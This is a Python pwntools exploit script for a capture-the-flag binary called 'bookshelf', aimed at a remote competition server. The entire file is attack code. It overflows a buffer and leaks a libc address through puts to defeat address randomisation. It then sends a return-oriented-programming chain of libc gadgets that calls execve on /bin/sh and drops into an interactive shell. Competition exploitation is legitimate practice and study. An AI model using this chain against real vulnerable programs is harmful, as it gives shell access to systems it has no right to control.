from pwn import *
elf = context.binary = ELF("./bookshelf_patched")
libc = ELF("./libc.so.6")
r = elf.process()
r = remote("chal.pctf.competitivecyber.club", 8989)
# gdb.attach(r, '''
#     b* adminBook + 92\n
#     b* adminBook + 114\n
#     c
# ''')


r.sendline(str(1))
r.sendline(b"y")
r.sendline(b"1" * 39)
r.send(b"\n")
r.sendline(str(3))
pop_rdi = 0x40101c
ret = pop_rdi + 1
payload = p64(0x404500) * 7 + p64(ret) + p64(pop_rdi) + p64(elf.got["puts"]) + p64(elf.plt["puts"]) + p64(elf.sym["adminBook"] + 73)
r.sendline(payload)
r.recvuntil(b"special book...")
r.recvuntil(b" >> Book saved!\n")
libc.address = u64(r.recv(6).ljust(8, b"\0")) - libc.sym["puts"]
log.success(f"PUTS: {hex(libc.address)}")

binsh = next(libc.search(b"/bin/sh"))
system = libc.sym["system"]
pop_rdi = libc.address + 0x000000000002a3e5
pop_rsi = 0x000000000002be51 + libc.address
pop_rdx_rbx = 0x0000000000090529 + libc.address
pop_rax = 0x0000000000045eb0 + libc.address
syscall = 0x0000000000029db4 + libc.address
ret = pop_rdi + 1
payload = p64(0x404500)*7 + p64(ret) 
payload += p64(pop_rdi) + p64(binsh)
payload += p64(pop_rdx_rbx) + p64(0) + p64(0)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rax) + p64(0x3b)
payload += p64(syscall)
r.send(payload)

r.interactive()